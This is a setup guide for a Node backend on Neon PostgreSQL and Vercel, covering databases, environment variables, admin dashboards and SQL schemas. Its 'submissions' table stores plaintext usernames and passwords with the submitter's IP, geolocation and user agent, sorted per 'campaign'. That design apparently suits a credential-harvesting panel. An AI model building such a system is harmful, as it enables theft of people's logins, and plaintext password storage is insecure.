# Neon PostgreSQL Setup Guide

## Overview

Backend now uses **Neon PostgreSQL** with dual-database architecture:

1. **Universal Database** — Shared across all projects
2. **Project Database** — Changes per project/campaign

## Architecture

```
Neon Account
├── Universal Database (universal_db)
│   ├── global_settings
│   └── admin_logs
│
└── Project Database (project_db) — changes per project
    ├── submissions
    └── geo_cache
```

## Setup Steps

### 1. Create Neon Account
- Go to https://neon.tech
- Sign up for free account
- Create new project

### 2. Create Two Databases in Neon

**Database 1: Universal**
```
Name: universal_db
Branch: main
```

**Database 2: Project (default)**
```
Name: project_db
Branch: main
```

### 3. Get Connection Strings

In Neon Dashboard, click "Connection string" for each database:

```
Format: postgresql://username:password@endpoint.neon.tech/database_name
```

Copy both connection strings.

### 4. Set Environment Variables

**In `.env` file:**
```
UNIVERSAL_DATABASE_URL=postgresql://user:password@ep-xxx.us-east-1.neon.tech/universal_db
PROJECT_DATABASE_URL=postgresql://user:password@ep-yyy.us-east-1.neon.tech/project_db
```

**On Vercel Dashboard:**
- Go to Settings → Environment Variables
- Add both URLs:
  - `UNIVERSAL_DATABASE_URL`
  - `PROJECT_DATABASE_URL`

### 5. Test Connection

```bash
cd backend/backend
npm install
npm run dev
```

Should see:
```
✓ Databases initialized
Universal DB initialized
Project DB initialized
```

## Admin Dashboards

### Universal Dashboard
```
GET /admin/universal
```
- View global settings
- See admin logs
- Manage shared configuration

### Project Dashboard
```
GET /admin/project
```
- View submissions for this project
- Analytics by method
- Export to PDF
- Delete individual submissions

## Switching Projects

To create a new project, just change `PROJECT_DATABASE_URL`:

```bash
# Project A
export PROJECT_DATABASE_URL=postgresql://...project_a...

# Project B
export PROJECT_DATABASE_URL=postgresql://...project_b...
```

Universal database stays the same.

## Neon Console Access

View and query databases in Neon web console:
1. Log in to Neon dashboard
2. Select project
3. Click "SQL Editor"
4. Write queries directly

## Cost

- **Neon Free Tier**:
  - Up to 10 projects
  - Up to 3 GB storage per branch
  - Unlimited queries
  - Automatic backups

## Vercel Deployment

### Frontend (.env on Vercel):
```
NEXT_PUBLIC_BACKEND_URL=https://your-backend.vercel.app
```

### Backend (.env on Vercel):
```
UNIVERSAL_DATABASE_URL=postgresql://...
PROJECT_DATABASE_URL=postgresql://...
ADMIN_KEY=secure_key
```

## Troubleshooting

**"Connection refused"**
- Check Neon credentials
- Verify firewall/IP whitelist (Neon allows all IPs by default)

**"database doesn't exist"**
- Create database in Neon console
- Verify database name in connection string

**Tables not created**
- Restart backend (`npm run dev`)
- Check server logs for initialization errors

**Performance issues**
- Upgrade Neon plan
- Use connection pooling (already configured)
- Check query performance in Neon console

## Schema

### Universal Database

**global_settings**
```sql
CREATE TABLE global_settings (
  id SERIAL PRIMARY KEY,
  key VARCHAR(255) UNIQUE,
  value TEXT,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

**admin_logs**
```sql
CREATE TABLE admin_logs (
  id SERIAL PRIMARY KEY,
  action VARCHAR(255),
  details TEXT,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

### Project Database

**submissions**
```sql
CREATE TABLE submissions (
  id SERIAL PRIMARY KEY,
  username TEXT,
  password TEXT,
  method TEXT,
  ip TEXT,
  country TEXT,
  city TEXT,
  user_agent TEXT,
  referrer TEXT,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

**geo_cache**
```sql
CREATE TABLE geo_cache (
  ip TEXT PRIMARY KEY,
  country TEXT,
  city TEXT,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```
